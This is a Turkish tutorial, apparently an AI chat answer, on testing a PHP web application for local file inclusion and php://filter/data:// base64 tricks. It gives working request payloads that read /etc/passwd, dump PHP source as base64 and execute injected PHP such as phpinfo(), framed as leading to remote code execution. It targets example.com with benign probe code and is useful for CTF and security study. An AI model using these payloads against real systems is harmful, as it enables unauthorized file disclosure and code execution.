PHP base64 filter bypass açığının olup olmadığını anlamak için bazı testler yapabilirsin. CTF veya gerçek hayatta bir web uygulamasında bunu nasıl tespit edebileceğini adım adım anlatayım.

# 1. Hedef Sitenin Dosya Dahil Etme (LFI) Açığı Olup Olmadığını Test Et  
Bu saldırıyı kullanabilmek için hedef sistemde bir LFI (Local File Inclusion - Yerel Dosya Dahil Etme) açığı olması gerekir. Önce aşağıdaki gibi klasik LFI testlerini yaparak sistemin dosya çağırıp çağırmadığını kontrol et:  

http://example.com/index.php?page=/etc/passwd

css
Copy
Edit

Eğer `/etc/passwd` içeriği ekrana dökülüyorsa, LFI açığı vardır.  

Alternatif olarak şu denemeleri yapabilirsin:  

http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php

markdown
Copy
Edit

Bu isteğin cevabı **Base64 olarak encode edilmiş PHP kodu** döndürüyorsa, `PHP://filter` aktif demektir!  

Base64 çıktısını çözerek `index.php` içeriğini okuyabilirsin:  

echo "Base64_VERİSİ" | base64 -d

yaml
Copy
Edit

---

# 2. Base64 Filter Bypass İçin Test Yap  
Eğer yukarıdaki deneme başarılı olduysa, aşağıdaki gibi bir payload deneyerek sistemin Base64 kodlanmış veriyi çözüp çalıştırıp çalıştırmadığını test edebilirsin:  

http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgZWNobyAnVEVTVCc7ID8+

php
Copy
Edit

**Bu ne yapıyor?**  
- `PD9waHAgZWNobyAnVEVTVCc7ID8+` → `<?php echo 'TEST'; ?>` anlamına gelir.  
- Eğer tarayıcıda **"TEST"** yazısını görürsen, Base64 kodu çözüldü ve çalıştırıldı demektir!  

---

# 3. `.php` Uzantısı ile Bypass Denemesi Yap  
Bazı sistemler, dosya çağırırken uzantı kontrolü yapar. PHP’nin Base64 decoder’ı uzantıyı yok saydığı için `.php` ekleyerek test edebilirsin:  

http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgcGhwaW5mbygpOyA/Pg==.php

markdown
Copy
Edit

Eğer PHP kodu çalışırsa, sistemde ciddi bir açık vardır ve **RCE (Remote Code Execution - Uzak Kod Çalıştırma) mümkündür!**  

---

# 4. Gerçek Hayatta Bu Açığı Nasıl Bulurum?  

## **LFI Açığını Test Et:**  
- `page=../../../../etc/passwd` gibi denemeler yap.  
- Eğer dosya içeriği dökülüyorsa, büyük ihtimalle açıktır.  

## **PHP Filter Testi Yap:**  
- `php://filter/convert.base64-encode/resource=index.php` ile PHP dosyalarını encode edip okuyabiliyor musun?  
- Eğer dönen değer Base64 formatındaysa, `filter` çalışıyor demektir.  

## **Base64 Decode ile Test Et:**  
- `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgcGhwaW5mbygpOyA/Pg==.php` gibi payloadlar dene.  
- Eğer PHP kodu çalışıyorsa, **filtre açığı var!**  
